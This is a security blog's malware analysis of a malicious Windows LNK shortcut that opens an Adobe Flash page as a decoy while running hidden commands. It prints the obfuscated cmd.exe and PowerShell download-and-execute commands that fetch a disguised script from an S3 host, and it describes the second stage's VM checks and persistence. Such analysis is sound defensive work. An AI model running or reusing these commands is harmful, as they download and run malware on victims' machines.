<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><title>Analyzing the Windows LNK file attack method - Tainted Bits</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Tainted Bits"><meta name="msapplication-TileImage" content="/images/logo-header.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Tainted Bits"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="Recently a friend of mine shared an interesting Malicious sample, it was a Microsoft shortcut file (LNK file) which after clicking(execution) lead to infection, although I was not aware of this type o"><meta property="og:type" content="article"><meta property="og:title" content="Analyzing the Windows LNK file attack method"><meta property="og:url" content="https://www.taintedbits.com/2019/02/16/analyzing-the-windows-lnk-file-attack-method/"><meta property="og:site_name" content="Tainted Bits"><meta property="og:description" content="Recently a friend of mine shared an interesting Malicious sample, it was a Microsoft shortcut file (LNK file) which after clicking(execution) lead to infection, although I was not aware of this type o"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://www.taintedbits.com/images/malware-1-thumbnail.jpeg"><meta property="article:published_time" content="2019-02-16T02:30:00.000Z"><meta property="article:modified_time" content="2021-03-11T10:27:20.869Z"><meta property="article:author" content="D3xt3r"><meta property="article:tag" content="Dropper"><meta property="article:tag" content="Windows Malware"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/images/malware-1-thumbnail.jpeg"><meta property="twitter:creator" content="@0xd3xt3r"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.taintedbits.com/2019/02/16/analyzing-the-windows-lnk-file-attack-method/"},"headline":"Tainted Bits","image":[],"datePublished":"2019-02-16T02:30:00.000Z","dateModified":"2021-03-11T10:27:20.869Z","author":{"@type":"Person","name":"D3xt3r"},"description":"Recently a friend of mine shared an interesting Malicious sample, it was a Microsoft shortcut file (LNK file) which after clicking(execution) lead to infection, although I was not aware of this type o"}</script><link rel="alternate" href="/atom.xml" title="Tainted Bits" type="application/atom+xml"><link rel="icon" href="/images/logo-header.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/railscasts.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css"><script src="https://www.googletagmanager.com/gtag/js?id=UA-128181439-1" async></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-128181439-1")</script><meta name="generator" content="Hexo 5.4.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/images/logo-header.png" alt="Tainted Bits" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/publications">Publication</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/0xd3xt3r"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time datetime="2019-02-16T02:30:00.000Z" title="2/16/2019, 8:00:00 AM">2019-02-16</time></span><span class="level-item">Updated&nbsp;<time datetime="2021-03-11T10:27:20.869Z" title="3/11/2021, 3:57:20 PM">2021-03-11</time></span><span class="level-item"><a class="link-muted" href="/categories/Malware-Analysis/">Malware Analysis</a></span><span class="level-item">11 minutes read (About 1665 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">Analyzing the Windows LNK file attack method</h1><div class="content"><p>Recently a friend of mine shared an interesting Malicious sample, it was a Microsoft shortcut file (LNK file) which after clicking(execution) lead to infection, although I was not aware of this type of attack vector before doing a basic research on google I was surprised that there is an increase in this type of attacks since 2017. In this post we will Analysis the LNK file malware and uncover how attacker uses multiple layers of obfuscation to evade AV and finally dropping malicious binary, we will also look into how to de-obfuscate each layer and understand what the code is doing.</p><span id="more"></span><p>File we are analyzing is <strong>af6df15050dea1a756bb99bb0597d7072c2aee4c</strong></p><h2 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h2><p>The reason I got interested in this particular sample is how innocent this file looked and how convincing it was from a social-engineering standpoint. Been a shortcut file it doesn’t look suspicious to an average user as the file is not EXE. Next when user clicks the files, a browser windows pops up and it opens up the link <a target="_blank" rel="noopener" href="https://get.adobe.com/br/flashplayer/">https://get.adobe.com/br/flashplayer/</a> which make the user thinks that there is a flash plugin missing in his system that’s why he couldn’t open/execute the file, but once he has installed flash player and when he tries to open the file again and realizes its just a junk file its already too late.</p><p>But in background what actually happens is it executes a Powershell command via shell command to downloads the next layer of Powershell script that does the actual downloading and installing of the main malicious executable. The file which it downloads is a BMP file which again looks an innocent image file but it actually is a disguised Powershell file.</p><h2 id="What-is-the-LNK-file"><a href="#What-is-the-LNK-file" class="headerlink" title="What is the LNK file?"></a>What is the LNK file?</h2><p>LNK is a file extension for a shortcut file used by Microsoft Windows to point to an executable file or an application. LNK files are generally used to create start menu and desktop shortcuts. LNK stands for LiNK. LNK files can be disguised as a legitimate document by changing the icon but it was not done in this sample.</p><h2 id="Basic-Analysis"><a href="#Basic-Analysis" class="headerlink" title="Basic Analysis"></a>Basic Analysis</h2><p>Here is a look at how the general file properties look like.</p><img src="/2019/02/16/analyzing-the-windows-lnk-file-attack-method/file-type.png" title="Malicious link file"><p>Taking a look at the <em>Shortcut</em> tab will give us even more details, below is what it looks like.</p><img src="/2019/02/16/analyzing-the-windows-lnk-file-attack-method/lnk-file-target.png" title="LNK file targeting application"><p>As you can see in the target field, it is pointing yo commands prompt executable with some arguments. This is the command which will run on executing this LNK file. But hold on this is not the entire command.<br>The maximum length for <em>Shortcut &gt; Target</em> is only 260 characters. Anything longer than that will not be visible. However, the maximum length for a command line argument is 4096 characters, so we can’t see the whole command in the window above. I have used another tool to extract the entire command.</p><h2 id="Digging-into-LNK-file-format"><a href="#Digging-into-LNK-file-format" class="headerlink" title="Digging into LNK file format"></a>Digging into LNK file format</h2><p>Using an LNK file analysis tool we can manage to get the whole embedded command as shown below</p><img src="/2019/02/16/analyzing-the-windows-lnk-file-attack-method/lnk-file-cmd-report.png" title="Extracting command from LNK file"><p>Fields of interest from the above extract properties of LNK files are :</p><table><thead><tr><th>KEY</th><th>VALUE</th></tr></thead><tbody><tr><td>Relative path</td><td>..\..\..\..\Windows\system32\cmd.exe</td></tr><tr><td>Working Directory</td><td>%SystemRoot%\System32</td></tr><tr><td>Arguments</td><td>/V /C set x4OAGWfxlES02z6NnUkK=2whttpr0&amp;&amp;…</td></tr></tbody></table><p>Lets take a close look at the <em>Arguments</em> field which is a follows :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\Windows\system32\cmd.exe &#x2F;V &#x2F;C set x4OAGWfxlES02z6NnUkK&#x3D;2whttpr0&amp;&amp;set L1U03HmUO6B9IcurCNNlo4&#x3D;.com&amp;&amp; echo | start %x4OAGWfxlES02z6NnUkK:~2,4%s:&#x2F;&#x2F;get.adobe%L1U03HmUO6B9IcurCNNlo4%&#x2F;br&#x2F;flashplayer&#x2F; &amp;&amp;set aZM4j3ZhPLBn9MpuxaO&#x3D; -win 1 &amp;&amp;set MlyavWfE&#x3D;ndows&amp;&amp;set jA8Axao1xcZ&#x3D;iEx&amp;&amp;set WMkgA3uXa1pXx&#x3D;tRi&amp;&amp;set KNhGmAqHG5&#x3D;bJe&amp;&amp;set 4kxhaz6bqqKC&#x3D;LOad&amp;&amp;set rwZCnSC7T&#x3D;nop&amp;&amp;set jcCvC&#x3D;NEw&amp;&amp;set ZTVZ&#x3D;wEbc&amp;&amp;set DABThzRuTT2hYjVOy&#x3D;nt).dow&amp;&amp;set cwdOsPOdA08SZaXVp1eFR&#x3D;t NeT.&amp;&amp;set Rb&#x3D;Ers&amp;&amp;set j4HfRAqYXcRZ3R&#x3D;hEll&amp;&amp;set Kpl01SsXY5tthb1&#x3D;.bmp&amp;&amp;set vh7q6Aq0zZVLclPm&#x3D;\v1.0\&amp;&amp;set 2Mh&#x3D;pOw&amp;&amp;set 8riacao&#x3D;%x4OAGWfxlES02z6NnUkK:~2,4%s:&#x2F;&#x2F;s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%&#x2F;juremasobra2&#x2F;jureklarj934t9oi4%Kpl01SsXY5tthb1%&amp;&amp;@echo off &amp;&amp; %SystemDrive% &amp;&amp; cd\ &amp;&amp; cd %SystemRoot%\System32 &amp;&amp;echo %jA8Axao1xcZ%(&quot;%jA8Axao1xcZ%(!jcCvC!-o%KNhGmAqHG5%c!cwdOsPOdA08SZaXVp1eFR!!ZTVZ!Lie!DABThzRuTT2hYjVOy!n%4kxhaz6bqqKC%S%WMkgA3uXa1pXx%NG(&#39;%x4OAGWfxlES02z6NnUkK:~2,4%s:&#x2F;&#x2F;s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%&#x2F;juremasobra2&#x2F;jureklarj934t9oi4%Kpl01SsXY5tthb1%&#39;)&quot;); | Wi!MlyavWfE!!2Mh!!Rb!!j4HfRAqYXcRZ3R!!vh7q6Aq0zZVLclPm!!2Mh!!Rb!!j4HfRAqYXcRZ3R! -!rwZCnSC7T!!aZM4j3ZhPLBn9MpuxaO! -</span><br></pre></td></tr></table></figure><p>Cleaning up the above messy command its just series of shell commands which are concatenated with &amp;&amp; when cleaned will look like as shown below.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> x4OAGWfxlES02z6NnUkK=2whttpr0</span><br><span class="line"><span class="built_in">set</span> L1U03HmUO6B9IcurCNNlo4=.com</span><br><span class="line"><span class="built_in">echo</span> | start %x4OAGWfxlES02z6NnUkK:~2,4%s://get.adobe%L1U03HmUO6B9IcurCNNlo4%/br/flashplayer/</span><br><span class="line"><span class="built_in">set</span> aZM4j3ZhPLBn9MpuxaO= -win 1</span><br><span class="line"><span class="built_in">set</span> MlyavWfE=ndows</span><br><span class="line"><span class="built_in">set</span> jA8Axao1xcZ=iEx</span><br><span class="line"><span class="built_in">set</span> WMkgA3uXa1pXx=tRi</span><br><span class="line"><span class="built_in">set</span> KNhGmAqHG5=bJe</span><br><span class="line"><span class="built_in">set</span> 4kxhaz6bqqKC=LOad</span><br><span class="line"><span class="built_in">set</span> rwZCnSC7T=nop</span><br><span class="line"><span class="built_in">set</span> jcCvC=NEw</span><br><span class="line"><span class="built_in">set</span> ZTVZ=wEbc</span><br><span class="line"><span class="built_in">set</span> DABThzRuTT2hYjVOy=nt).dow</span><br><span class="line"><span class="built_in">set</span> cwdOsPOdA08SZaXVp1eFR=t NeT.</span><br><span class="line"><span class="built_in">set</span> Rb=Ers</span><br><span class="line"><span class="built_in">set</span> j4HfRAqYXcRZ3R=hEll</span><br><span class="line"><span class="built_in">set</span> Kpl01SsXY5tthb1=.bmp</span><br><span class="line"><span class="built_in">set</span> vh7q6Aq0zZVLclPm=\\v1.0\\</span><br><span class="line"><span class="built_in">set</span> 2Mh=pOw</span><br><span class="line"><span class="built_in">set</span> 8riacao=%x4OAGWfxlES02z6NnUkK:~2,4%s://s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%/juremasobra2/jureklarj934t9oi4%Kpl01SsXY5tthb1%</span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">%SystemDrive%</span><br><span class="line"><span class="built_in">cd</span>\\</span><br><span class="line"><span class="built_in">cd</span> %SystemRoot%\\System32</span><br><span class="line"><span class="built_in">echo</span> %jA8Axao1xcZ%(<span class="string">&quot;%jA8Axao1xcZ%(!jcCvC!-o%KNhGmAqHG5%c!cwdOsPOdA08SZaXVp1eFR!!ZTVZ!Lie!DABThzRuTT2hYjVOy!n%4kxhaz6bqqKC%S%WMkgA3uXa1pXx%NG(&#x27;%x4OAGWfxlES02z6NnUkK:~2,4%s://s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%/juremasobra2/jureklarj934t9oi4%Kpl01SsXY5tthb1%&#x27;)&quot;</span>); | Wi!MlyavWfE!!2Mh!!Rb!!j4HfRAqYXcRZ3R!!vh7q6Aq0zZVLclPm!!2Mh!!Rb!!j4HfRAqYXcRZ3R! -!rwZCnSC7T!!aZM4j3ZhPLBn9MpuxaO! --%ProgramFiles%\\Internet Explorer\\iexplore.exe</span><br></pre></td></tr></table></figure><p>each line in the above section is the shell command. The first couple of line is setting up some variables and then in line number 3 and the last line uses those variables to assemble those variables and execute it. This method of assembly and disassembly of variable names makes the code harder to read.</p><p>The above obfuscated shell script decodes to the below two command:</p><ol><li><code>C:\Windows\system32\cmd.exe /V /C set x4OAGWfxlES02z6NnUkK=2whttpr0&amp;&amp;set L1U03HmUO6B9IcurCNNlo4=.com &amp;&amp; echo | start https://get.adobe.com/br/flashplayer/</code> this command open up adobe flashplayer installation page on the browser window.</li><li><code>echo iEx(&quot;iEx(New-Object Net.WebClient).DownloadString(&#39;hxxps://s3-eu-west-1.amazonaws.com/juremasobra2/jureklarj934t9oi4.bmp&#39;)&quot;); | WindowsPowershell\v1.0\Powershell -nop -win 1 --%ProgramFiles%\\Internet Explorer\\iexplore.exe</code> this command actually download this second layer of Powershell which file which is disguised as a BMP file in the URL</li></ol><h2 id="Decoding-Second-Layer-Powershell"><a href="#Decoding-Second-Layer-Powershell" class="headerlink" title="Decoding Second Layer Powershell"></a>Decoding Second Layer Powershell</h2><p>The Powershell script which was downloaded by the above LNK file can be found on this <a target="_blank" rel="noopener" href="https://github.com/d3xt3rsl4b/analyzed-malware/blob/master/lnk_malware/jureklarj934t9oi4.ps1">link</a> fd60a8b790b42f0c416c28e4ad22dc317ad8fbc5 which it is heavily obfuscated, its obfuscated using <a target="_blank" rel="noopener" href="http://www.powertheshell.com/obfuscationmode/">ISESteriods</a>. I did manage to decode the script and the readable code can be found on this <a target="_blank" rel="noopener" href="https://github.com/d3xt3rsl4b/analyzed-malware/blob/master/lnk_malware/decoded.ps1">link</a>.</p><p>The script on execution does the following:</p><ol><li>Checks if it’s running on inside a virtual machine, if it is running then it doesn’t execute rest of the command and exits. Otherwise, it processed to next steps. The script checks for the below list of virtual machines:<ol><li>VirtualBox</li><li>VMware Virtual Platform</li><li>Virtual Machine</li><li>HVM domU</li></ol></li><li>Then it creates a Mutex with name <em>444444444444</em>, this is to make sure that there is only one instance of this program running.</li><li>If the previous step succeed then it downloads a zip which again disguised as an image file from following URL hxxps://s3-eu-west-1.amazonaws.com/juremasobra2/image2.png which is <em>887eafc19419df5119a829fd05d898503b7a0217</em></li><li>Renames the PNG file to ZIP file</li><li>Extracts the content from the zip file which contains a DLL <em>92be09ca93ad6a8b04b7e2e2087fc6884fef1f63</em> and copies this files to startup folder.</li><li>Then it uses a persistence mechanism by creating a shortcut file in the startup folder, this shortcut file(again LNK) invokes <em>run32.dll</em> in the command shell to run the malicious DLL binary. Since run32.dll is a built-in signed binary it doesn’t raise more suspicion. For example this command <em>rundll32.exe shell32.dll, ShellExec_RunDLL notepad.exe</em> will launch notepad.exe.</li><li>Then the script sleeps for 40 sec and then restarts the machine.</li></ol><p>By above-mentioned persistence, technique attacker is trying to hide its malicious DLL binary behind a legitimate binary.</p><p>More about this persistence mechanism can be found on this <a target="_blank" rel="noopener" href="https://blogs.technet.microsoft.com/motiba/2017/11/04/chasing-adversaries-with-autoruns-evading-techniques-and-countermeasures/">link</a></p><h2 id="All-Files"><a href="#All-Files" class="headerlink" title="All Files"></a>All Files</h2><table><thead><tr><th>SHA1</th><th>Description</th></tr></thead><tbody><tr><td>af6df15050dea1a756bb99bb0597d7072c2aee4c</td><td>malicious LNK file</td></tr><tr><td>fd60a8b790b42f0c416c28e4ad22dc317ad8fbc5</td><td>Powershell file dropped by above LNK file</td></tr><tr><td>887eafc19419df5119a829fd05d898503b7a0217</td><td>ZIP file dropped by above Powershell file</td></tr><tr><td>92be09ca93ad6a8b04b7e2e2087fc6884fef1f63</td><td>Malicious DLL file unzip from above zip file</td></tr></tbody></table><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li><a target="_blank" rel="noopener" href="https://www.dfir.training/windows/lnk/116-windows-shortcut-file-lnk-format/file">LNK file format</a></li><li><a target="_blank" rel="noopener" href="https://securitynews.sonicwall.com/xmlpost/lnk-file-is-actively-being-leveraged-to-run-file-less-powershell-script/">Other attacks similar to this</a></li><li><a target="_blank" rel="noopener" href="https://blog.trendmicro.com/trendlabs-security-intelligence/rising-trend-attackers-using-lnk-files-download-malware/">TreadMicro blog on threads on this type of attacks</a></li></ol></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/Dropper/">Dropper</a><a class="link-muted mr-2" rel="tag" href="/tags/Windows-Malware/">Windows Malware</a></div></article></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2019/09/15/testing-heap-exploit-on-different-glibc-verison/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">Testing Linux Heap exploits on different Glibc version (with source-level debugging setup)</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2018/12/17/unpacking-grey-energy-malware/"><span class="level-item">Unpacking Grey Energy malware (Service Application DLL)</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div id="disqus_thread"><noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div><script>var disqus_config=function(){this.page.url="https://www.taintedbits.com/2019/02/16/analyzing-the-windows-lnk-file-attack-method/",this.page.identifier="2019/02/16/analyzing-the-windows-lnk-file-attack-method/"};!function(){var t=document,e=t.createElement("script");e.src="//taintedbits.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen order-1"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#Motivation"><span class="level-left"><span class="level-item">1</span><span class="level-item">Motivation</span></span></a></li><li><a class="level is-mobile" href="#What-is-the-LNK-file"><span class="level-left"><span class="level-item">2</span><span class="level-item">What is the LNK file?</span></span></a></li><li><a class="level is-mobile" href="#Basic-Analysis"><span class="level-left"><span class="level-item">3</span><span class="level-item">Basic Analysis</span></span></a></li><li><a class="level is-mobile" href="#Digging-into-LNK-file-format"><span class="level-left"><span class="level-item">4</span><span class="level-item">Digging into LNK file format</span></span></a></li><li><a class="level is-mobile" href="#Decoding-Second-Layer-Powershell"><span class="level-left"><span class="level-item">5</span><span class="level-item">Decoding Second Layer Powershell</span></span></a></li><li><a class="level is-mobile" href="#All-Files"><span class="level-left"><span class="level-item">6</span><span class="level-item">All Files</span></span></a></li><li><a class="level is-mobile" href="#Reference"><span class="level-left"><span class="level-item">7</span><span class="level-item">Reference</span></span></a></li></ul></div></div><style>#toc .menu-list>li>a.is-active+.menu-list{display:block}#toc .menu-list>li>a+.menu-list{display:none}</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time datetime="2021-02-14T18:30:00.000Z">2021-02-15</time></p><p class="title"><a href="/2021/02/15/arm-architecture-webinar/">ARM Architecture and Shellcode Webinars</a></p><p class="categories"><a href="/categories/Binary-Exploitation/">Binary Exploitation</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2020-06-06T18:30:00.000Z">2020-06-07</time></p><p class="title"><a href="/2020/06/07/binary-exploitation-pwnable-kr-level-6/">Binary Exploitation [pwnable.kr] - (Level 6) random</a></p><p class="categories"><a href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2020-06-05T18:30:00.000Z">2020-06-06</time></p><p class="title"><a href="/2020/06/06/binary-exploitation-pwnable-kr-level-5/">Binary Exploitation [pwnable.kr] - (Level 5) passcode</a></p><p class="categories"><a href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2020-05-16T18:30:00.000Z">2020-05-17</time></p><p class="title"><a href="/2020/05/17/binary-exploitation-pwnable-kr-level-4/">Binary Exploitation [pwnable.kr] - (Level 4) flag</a></p><p class="categories"><a href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2020-05-15T18:30:00.000Z">2020-05-16</time></p><p class="title"><a href="/2020/05/16/binary-exploitation-pwnable-kr-level-3/">Binary Exploitation [pwnable.kr] - (Level 3) BOF</a></p><p class="categories"><a href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/Binary-Exploitation/"><span class="level-start"><span class="level-item">Binary Exploitation</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Brain-Logs/"><span class="level-start"><span class="level-item">Brain Logs</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/CTF-Writeups/"><span class="level-start"><span class="level-item">CTF Writeups</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/categories/Exploitation/"><span class="level-start"><span class="level-item">Exploitation</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/IoT/"><span class="level-start"><span class="level-item">IoT</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/categories/Machine-Learning/"><span class="level-start"><span class="level-item">Machine Learning</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/categories/Malware-Analysis/"><span class="level-start"><span class="level-item">Malware Analysis</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/categories/NLP/"><span class="level-start"><span class="level-item">NLP</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Reverse-Engineering/"><span class="level-start"><span class="level-item">Reverse Engineering</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/ACS712/"><span class="tag">ACS712</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Arduino/"><span class="tag">Arduino</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Bare-Metal/"><span class="tag">Bare-Metal</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Chat-Bots/"><span class="tag">Chat Bots</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Classification/"><span class="tag">Classification</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Data-Wrangling/"><span class="tag">Data Wrangling</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Dev/"><span class="tag">Dev</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Dropper/"><span class="tag">Dropper</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ESP8266/"><span class="tag">ESP8266</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Editor/"><span class="tag">Editor</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Emacs/"><span class="tag">Emacs</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Exploitation/"><span class="tag">Exploitation</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/GandCrab/"><span class="tag">GandCrab</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Grey-Energy/"><span class="tag">Grey Energy</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Kernel-Debugging/"><span class="tag">Kernel Debugging</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux/"><span class="tag">Linux</span><span class="tag">9</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux-Malware/"><span class="tag">Linux Malware</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Malware-Analysis/"><span class="tag">Malware Analysis</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Python/"><span class="tag">Python</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Regression/"><span class="tag">Regression</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Reverse-Engineering/"><span class="tag">Reverse Engineering</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Visualization/"><span class="tag">Visualization</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Windows-Malware/"><span class="tag">Windows Malware</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Windows-Reversing/"><span class="tag">Windows Reversing</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/glibc/"><span class="tag">glibc</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/javascript-obfuscation/"><span class="tag">javascript obfuscation</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwnable/"><span class="tag">pwnable</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwnable-kr/"><span class="tag">pwnable-kr</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/radare2/"><span class="tag">radare2</span><span class="tag">4</span></a></div></div></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/images/logo-header.png" alt="Tainted Bits" height="28"></a><p class="is-size-7"><span>&copy; 2021 D3xt3r</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by-sa/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Subscribe" href="https://mailchi.mp/d744c1f04904/taintedbits"><i class="fa fa-envelope"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/0xd3xt3r"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en")</script><script>var IcarusThemeSettings={article:{highlight:{clipboard:!0,fold:"unfolded"}}}</script><script src="/js/column.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load",()=>{"function"==typeof 